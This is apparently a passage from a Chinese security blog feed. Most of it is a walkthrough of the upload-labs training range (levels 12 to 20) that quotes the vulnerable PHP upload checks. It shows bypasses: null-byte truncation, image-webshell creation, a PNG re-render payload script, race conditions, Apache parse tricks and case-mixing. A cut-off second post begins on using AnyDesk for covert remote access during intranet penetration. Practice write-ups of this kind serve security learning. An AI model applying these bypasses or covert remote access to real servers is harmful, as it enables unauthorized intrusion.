&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与Pass-11不同,这里用到了POST传值,这里用到的也是00截断</p><p>但是%00指的是一个空字符,代表结束,GET传值因为url编码会把它解析成空字符,而POST传值没有这个特点,所以我们得手动通过通过请求头的hex编码所对应的地方添加00（十六进制）来达到目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">因此先在upload/后添加任意字符（一般为空格，因为空格对应的hex码为20比较好记）<br>通过hex编码我们可以找到upload/的位置，把它后面的20改为00即可。<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170611551.png" alt="image-20240107170611551"><br>还是由于这里没有低版的php截不了图</p><p><strong>Pass-13</strong><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170622977.png" alt="image-20240107170622977"><br>制作图片马<br>在cmd中执行copy 1.jpg &#x2F;b + phpinfo.php &#x2F;b phpinfo.jpg</p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170643135.png" alt="image-20240107170643135"><br>可以利用文件包含<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170706490.png" alt="image-20240107170706490"><br>成功解析了</p><p><strong>Pass-14</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[2]);<br>        <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=0)&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实就是多了对文件类型的判断，getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>绕过方式和Pass-13一样</p><p><strong>Pass-15</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    //需要开启php_exif模块<br>    <span class="hljs-variable">$image_type</span> = exif_imagetype(<span class="hljs-variable">$filename</span>);<br>    switch (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-built_in">break</span>;    <br>        default:<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-built_in">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170718700.png" alt="image-20240107170718700"></p><p>exif_imagetype()函数用于判断一个图像的类型<br>所以绕过和Pass-13一样<br><strong>Pass-16</strong><br>是一个文件的二次渲染<br>先参考：<a href="https://xz.aliyun.com/t/2657#toc-3">https://xz.aliyun.com/t/2657#toc-3</a><br>直接利用现成的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,<br>           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,<br>           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,<br>           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,<br>           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,<br>           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,<br>           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,<br>           0x66, 0x44, 0x50, 0x33);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(32, 32);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = 0; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += 3) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+1];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+2];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / 3), 0, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>运行后用16进制形式打开文件<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170756881.png" alt="image-20240107170756881"><br>将这个文件上传抓包拦截，修改里面的内容，当然也可以直接打开修改在上传<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170805629.png" alt="image-20240107170805629"><br>成功解析了<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170814461.png" alt="image-20240107170814461"></p><p><strong>Pass-17</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析源码move_uploaded_file($temp_file, $upload_file)会把上传的文件先移到一个临时文件，然后判断文件是否合法了在移动回去。<br>所以需要利用条件竞争删除文件时间差绕过。使用burpsuite<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170827129.png" alt="image-20240107170827129"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170834890.png" alt="image-20240107170834890"><br>点击Start attack<br>成功访问到<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170844939.png" alt="image-20240107170844939"><br><strong>Pass-18</strong><br>查看源码<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170925844.png" alt="image-20240107170925844"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170935053.png" alt="image-20240107170935053"><br>前面有个upload,那我们利用条件竞争绕过访问改名前的文件时得在文件前面也要加个upload<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171019156.png" alt="image-20240107171019156">7z后缀并不被Apache服务器所识别，却在上传文件名后缀的白名单中，可以利用Apache的解析漏洞将上传的7z后缀文件当做php文件解析<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171038056.png" alt="image-20240107171038056"><br>成功解析<br><strong>Pass-19</strong><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171047076.png" alt="image-20240107171047076"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>采用了黑名单的限制，大小写混写可绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171055855.png" alt="image-20240107171055855"><br><strong>Pass-20</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    //检查MIME<br>    <span class="hljs-variable">$allow_type</span> = array(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        //检查文件名<br>        <span class="hljs-variable">$file</span> = empty(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1.首先会对mime进行检测，所以要上传图片的mime<br>2.检查save_name是否为空,如果为空就用文件名赋值给$file,否则用save_name<br>3.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>           <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>       &#125;<br></code></pre></td></tr></table></figure><p>判断是否为数组，如果不是数据就以”.”拆分为数组<br>4.判断后缀是否是白名单的.jpg、.png、.gif</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>       <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>       <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>))<br></code></pre></td></tr></table></figure><p>5.一切都过了之后就是文件重命名了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br></code></pre></td></tr></table></figure><p>取数组第一个为文件名，取数组倒数第二个为文件后缀</p><p>绕过步骤：<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171114545.png" alt="image-20240107171114545"><br>upload&#x2F;upload.php.后面多个.但是windows环境下.会被默认去掉</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未开启3389实现远程桌面</title>
    <link href="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <url>/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p>在内网渗透时如果目标没有开启3389，或者通过某种手段给禁用掉了。此时我们就可以通过今天介绍的工具进行远程连接。<br><strong>项目地址</strong><br><a href="https://download.anydesk.com/AnyDesk.exe">https://download.anydesk.com/AnyDesk.exe</a><br>打开应用<br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165858606.png" alt="image-20240107165858606"><br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165909402.png" alt="image-20240107165909402"><br>设置连接的用户名和密码</p><p>退出本地的AnyDesk,然后到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">c:\Users\&#123;USER&#125;\AppData\Roaming\AnyDesk    目录下将<br>ad.trace、service.conf、system.conf、user.conf<br>这个<span 